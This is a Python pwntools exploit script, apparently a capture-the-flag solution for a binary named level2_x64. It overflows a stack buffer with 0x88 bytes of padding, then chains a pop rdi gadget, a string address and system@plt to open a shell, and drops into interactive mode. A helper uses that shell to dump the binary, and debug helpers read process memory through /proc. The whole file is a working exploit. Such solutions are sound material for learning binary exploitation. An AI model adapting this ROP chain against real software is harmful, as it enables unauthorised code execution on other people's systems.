#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys

DEBUG = 1
context.arch = "amd64"
#context.log_level = "debug"
elf = ELF("./level2_x64",checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	s = process("./level2_x64")
elif DEBUG == 2:
	libc = ELF("./libc.so.6",checksec=False)
	s = process("./level2_x64", env={"LD_PRELOAD":"./libc.so.6"})
elif DEBUG == 3:
	libc = ELF("./libc.so.6",checksec=False)
	ip = "localhost" 
	port = 10001
	s = remote(ip,port)

def z(addr):
    raw_input("debug?")
    gdb.attach(s, "b *" + str(addr))

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open("/proc/%s/mem" % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink("/proc/%s/exe" % pid)
   with open("/proc/%s/maps" % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split("-")[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def zx(addr = 0):
    global mypid
    mypid = proc.pidof(s)[0]
    raw_input("debug?")
    with open("/proc/%s/mem" % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def pwn():
   pop_rdi = 0x4006b3

   z(0x40061E)

   payload = "A" * (0x80 + 8)
   payload += p64(pop_rdi)
   payload += p64(0x600A90)
   payload += p64(elf.plt["system"])

   s.sa("Input:", payload)

   # system("/bin/sh")
   #rdi rsi rdx rcx r8 r9 .....

   s.irt()

def dump():
	pwn()
	s.recv(timeout=1)
	s.sl("cat level2_x64")
	s.sl("exit")
	data = s.ra()
	f = open("dump", "wb")
	f.write(data)
	f.close()

if __name__ == "__main__":
    pwn()